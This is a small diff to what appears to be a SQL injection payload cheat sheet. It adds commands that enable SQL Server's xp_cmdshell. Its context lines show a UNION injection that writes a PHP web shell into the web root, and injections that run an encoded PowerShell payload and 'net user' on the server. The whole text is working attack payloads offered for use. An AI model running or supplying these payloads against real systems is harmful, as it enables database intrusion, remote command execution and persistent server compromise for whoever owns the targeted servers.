@@ -36,6 +36,12 @@
 #Upload a shell.
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
+#Enable xp_cmdshell on sql server 2005
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
 #Execute Commands
 ' EXEC xp_cmdshell 'powershell -E <base64_payload>'; --
 ' EXEC xp_cmdshell "net user";
